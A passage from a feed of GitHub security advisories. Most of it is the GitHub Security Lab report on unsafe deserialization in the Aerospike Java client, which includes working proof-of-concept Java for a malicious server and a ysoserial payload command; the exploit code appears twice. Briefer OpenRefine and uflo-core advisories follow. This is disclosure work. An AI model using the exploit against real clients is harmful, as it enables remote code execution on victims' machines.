<pre><code class="language-java">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {
        // --snip--
        if (s.getBytes()[7] == 0x44) {
            AttackMessage m = new AttackMessage(
                    Files.readAllBytes(Paths.get("location/of/deserialization/payload.bin")));
            ctx.channel().writeAndFlush(m);
            return;
        }
        // --snip--
    }
}
</code></pre>
<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>
<pre><code class="language-java">public class AttackMessage {

    private byte resultCode = 0;
    private int generation = 2;
    private int expiration = 417523457;
    private short fieldCount = 0;
    private short opCount = 1;
    private byte particleType = 7;
    private String name = "putgetbin";
    private byte[] payload;

    public AttackMessage(byte[] payload) {
        this.payload = payload;
    }

    // --snip-- (getters)

    public int[] getSize() {
        int size = 30 + name.length() + payload.length;
        int low = (byte) (size &amp; 0xFF);
        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;
        return new int[] {high, low};
    }

    public int getOpSize() {
        return payload.length + 4 + name.length();
    }

    public byte[] getPayload() {
        return payload;
    }
}
</code></pre>
<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>
<pre><code class="language-java">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {

    @Override
    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)
            throws Exception {
        // header
        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});
        int[] length = msg.getSize();
        out.writeByte(length[0]);
        out.writeByte(length[1]);

        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});
        out.writeByte(msg.getResultCode());
        out.writeInt(msg.getGeneration());
        out.writeInt(msg.getExpiration());

        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});
        out.writeShort(msg.getFieldCount());
        out.writeShort(msg.getOpCount());
        out.writeInt(msg.getOpSize());

        out.writeByte(0x01);
        out.writeByte(msg.getParticleType());

        out.writeByte(0x00);
        out.writeByte(msg.getName().length());
        out.writeCharSequence(msg.getName(), Charset.defaultCharset());
        out.writeBytes(msg.getPayload());
    }

}
</code></pre>
<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>
<pre><code class="language-xml">&lt;dependency&gt;
  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
  &lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>In which case, the malicious payload file could be generated using <a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a> as follows:</p>
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin
</code></pre>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by the GitHub CodeQL team members <a href="https://github.com/atorralba">@atorralba (Tony Torralba)</a> and <a href="https://github.com/joefarebrother">@joefarebrother (Joseph Farebrother)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36480">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>
<li><a href="https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>
<li><a href="https://github.com/advisories/GHSA-jj95-55cr-9597">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj95-55cr-9597</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-08-03T19:45:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses]]></title>
        <id>https://github.com/advisories/GHSA-jj95-55cr-9597</id>
        <link href="https://github.com/advisories/GHSA-jj95-55cr-9597"/>
        <updated>2023-08-17T05:02:46.000Z</updated>
        <content type="html"><![CDATA[<h1 id="github-security-lab-ghsl-vulnerability-report-ghsl-2023-044">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href="https://github.com/aerospike/aerospike-client-java/">Aerospike Java Client</a>.</p>
<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>
<h2 id="product">Product</h2>
<p>Aerospike Java Client</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7">6.1.7</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-unsafe-deserialization-of-server-responses-ghsl-2023-044">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>
<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>
<pre><code class="language-java">@Override
public void channelRead(ChannelHandlerContext ctx, Object msg) {
    command.read((ByteBuf)msg);
}
</code></pre>
<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code â€” for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>
<pre><code class="language-java">private void read(ByteBuf byteBuffer) {
    eventReceived = true;

    try {
        switch (state) {
            // --snip--
            case AsyncCommand.COMMAND_READ_HEADER:
                if (command.isSingle) {
                    readSingleHeader(byteBuffer);
                }
                // --snip--
        }
        // --snip--
    }
    // --snip---
}
</code></pre>
<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>
<pre><code class="language-java">private void readSingleHeader(ByteBuf byteBuffer) {
    int readableBytes = byteBuffer.readableBytes();
    int dataSize = command.dataOffset + readableBytes;

    // --snip--

    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);
    command.dataOffset = dataSize;

    if (command.dataOffset &gt;= receiveSize) {
        parseSingleBody();
    }
}
</code></pre>
<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>
<pre><code class="language-java">@Override
protected final boolean parseResult() {
    validateHeaderSize();

    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;
    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);
    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);
    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);
    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);
    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;

    if (resultCode == 0) {
        // --snip--
        skipKey(fieldCount);
        record = parseRecord(opCount, generation, expiration, isOperation);
        return true;
    }
</code></pre>
<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>
<pre><code class="language-java">protected final Record parseRecord(
    int opCount,
    int generation,
    int expiration,
    boolean isOperation
)  {
    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();

    for (int i = 0 ; i &lt; opCount; i++) {
        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);
        byte particleType = dataBuffer[dataOffset + 5];
        byte nameSize = dataBuffer[dataOffset + 7];
        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);
        dataOffset += 4 + 4 + nameSize;

        int particleBytesSize = opSize - (4 + nameSize);
        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);
</code></pre>
<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>
<pre><code class="language-java">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)
    throws AerospikeException {
        switch (type) {
            // --snip--
            case ParticleType.JBLOB:
                return Buffer.bytesToObject(buf, offset, len);
</code></pre>
<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>
<pre><code class="language-java">public static Object bytesToObject(byte[] buf, int offset, int length) {
    // --snip--
    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {
        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
            return oistream.readObject();
        }
    }
    // --snip--
}
</code></pre>
<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>
<pre><code class="language-java">private T unpackBlob(int count) throws IOException, ClassNotFoundException {
    // --snip--
    case ParticleType.JBLOB:
        // --snip--
        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {
            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
                val = getJavaBlob(oistream.readObject());
            }
        }
</code></pre>
<p>This vulnerability was discovered with the help of <a href="https://codeql.github.com/">CodeQL</a>.</p>
<h4 id="impact">Impact</h4>
<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>
<h4 id="remediation">Remediation</h4>
<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>
<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>
<h4 id="resources">Resources</h4>
<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>
<pre><code class="language-java">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {
        // --snip--
        if (s.getBytes()[7] == 0x44) {
            AttackMessage m = new AttackMessage(
                    Files.readAllBytes(Paths.get("location/of/deserialization/payload.bin")));
            ctx.channel().writeAndFlush(m);
            return;
        }
        // --snip--
    }
}
</code></pre>
<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>
<pre><code class="language-java">public class AttackMessage {

    private byte resultCode = 0;
    private int generation = 2;
    private int expiration = 417523457;
    private short fieldCount = 0;
    private short opCount = 1;
    private byte particleType = 7;
    private String name = "putgetbin";
    private byte[] payload;

    public AttackMessage(byte[] payload) {
        this.payload = payload;
    }

    // --snip-- (getters)

    public int[] getSize() {
        int size = 30 + name.length() + payload.length;
        int low = (byte) (size &amp; 0xFF);
        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;
        return new int[] {high, low};
    }

    public int getOpSize() {
        return payload.length + 4 + name.length();
    }

    public byte[] getPayload() {
        return payload;
    }
}
</code></pre>
<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>
<pre><code class="language-java">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {

    @Override
    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)
            throws Exception {
        // header
        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});
        int[] length = msg.getSize();
        out.writeByte(length[0]);
        out.writeByte(length[1]);

        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});
        out.writeByte(msg.getResultCode());
        out.writeInt(msg.getGeneration());
        out.writeInt(msg.getExpiration());

        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});
        out.writeShort(msg.getFieldCount());
        out.writeShort(msg.getOpCount());
        out.writeInt(msg.getOpSize());

        out.writeByte(0x01);
        out.writeByte(msg.getParticleType());

        out.writeByte(0x00);
        out.writeByte(msg.getName().length());
        out.writeCharSequence(msg.getName(), Charset.defaultCharset());
        out.writeBytes(msg.getPayload());
    }

}
</code></pre>
<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>
<pre><code class="language-xml">&lt;dependency&gt;
  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
  &lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>In which case, the malicious payload file could be generated using <a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a> as follows:</p>
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin
</code></pre>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by the GitHub CodeQL team members <a href="https://github.com/atorralba">@atorralba (Tony Torralba)</a> and <a href="https://github.com/joefarebrother">@joefarebrother (Joseph Farebrother)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36480">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>
<li><a href="https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>
<li><a href="https://github.com/advisories/GHSA-jj95-55cr-9597">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj95-55cr-9597</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-08-03T19:45:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine:main] OpenRefine Server-Side Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q7mc-fc87-v7w7</id>
        <link href="https://github.com/advisories/GHSA-q7mc-fc87-v7w7"/>
        <updated>2023-08-17T05:02:46.000Z</updated>
        <content type="html"><![CDATA[<p>OpenRefine &lt;= v3.5.2 contains a Server-Side Request Forgery (SSRF) vulnerability, which permits unauthorized users to exploit the system, potentially leading to unauthorized access to internal resources and sensitive file disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-41401">https://nvd.nist.gov/vuln/detail/CVE-2022-41401</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/blob/30d6edb7b6586623bda09456c797c35983fb80ff/main/tests/server/src/com/google/refine/importing/ImportingUtilitiesTests.java#L180">https://github.com/OpenRefine/OpenRefine/blob/30d6edb7b6586623bda09456c797c35983fb80ff/main/tests/server/src/com/google/refine/importing/ImportingUtilitiesTests.java#L180</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/blob/cb55cdfdf6f9ca916839778dc847cce803688998/main/src/com/google/refine/importing/ImportingUtilities.java#L103">https://github.com/OpenRefine/OpenRefine/blob/cb55cdfdf6f9ca916839778dc847cce803688998/main/src/com/google/refine/importing/ImportingUtilities.java#L103</a></li>
<li><a href="https://github.com/ixSly/CVE-2022-41401">https://github.com/ixSly/CVE-2022-41401</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/commit/8cb2fec45dd90fda8ed9608c691f6bb8ed721cd2">https://github.com/OpenRefine/OpenRefine/commit/8cb2fec45dd90fda8ed9608c691f6bb8ed721cd2</a></li>
<li><a href="https://github.com/advisories/GHSA-q7mc-fc87-v7w7">https://github.com/advisories/GHSA-q7mc-fc87-v7w7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q7mc-fc87-v7w7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-08-04T18:30:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.bstek.uflo:uflo-core] Remote Code Execution in com.bstek.uflo:uflo-core]]></title>
        <id>https://github.com/advisories/GHSA-8m9f-c5p9-wqch</id>
        <link href="https://github.com/advisories/GHSA-8m9f-c5p9-wqch"/>
        <updated>2023-08-17T05:02:42.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package com.bstek.uflo:uflo-core are vulnerable to Remote Code Execution (RCE) in the ExpressionContextImpl class via jexl.createExpression(expression).evaluate(context); functionality, due to improper user input validation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25894">https://nvd.nist.gov/vuln/detail/CVE-2022-25894</a></li>
<li><a href="https://fmyyy1.github.io/2022/10/23/uflo2rce/">https://fmyyy1.github.io/2022/10/23/uflo2rce/</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMBSTEKUFLO-3091112">https://security.snyk.io/vuln/SNYK-JAVA-COMBSTEKUFLO-3091112</a></li>
<li><a href="https://github.com/youseries/uflo/blob/b3e198bc6523e5a6ba69edd84ba10e05a3b78726/uflo-core/src/main/java/com/bstek/uflo/expr/impl/ExpressionContextImpl.java#L126">https://github.com/youseries/uflo/blob/b3e198bc6523e5a6ba69edd84ba10e05a3b78726/uflo-core/src/main/java/com/bstek/uflo/expr/impl/ExpressionContextImpl.java#L126</a></li>
<li><a href="https://github.com/youseries/uflo/blob/b3e198bc6523e5a6ba69edd84ba10e05a3b78726/uflo-core/src/main/java/com/bstek/uflo/expr/impl/ExpressionContextImpl.java%23L126">https://github.com/youseries/uflo/blob/b3e198bc6523e5a6ba69edd84ba10e05a3b78726/uflo-core/src/main/java/com/bstek/uflo/expr/impl/ExpressionContextImpl.java%23L126</a></li>
<li><a href="https://github.com/advisories/GHSA-8m9f-c5p9-wqch">https://github.com/advisories/GHSA-8m9f-c5p9-wqch</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m9f-c5p9-wqch</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-01-26T21:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.heron:heron-api] Heron allows CRLF log injection]]></title>
        <id>https://github.com/advisories/GHSA-95w5-q9vp-5vrm</id>
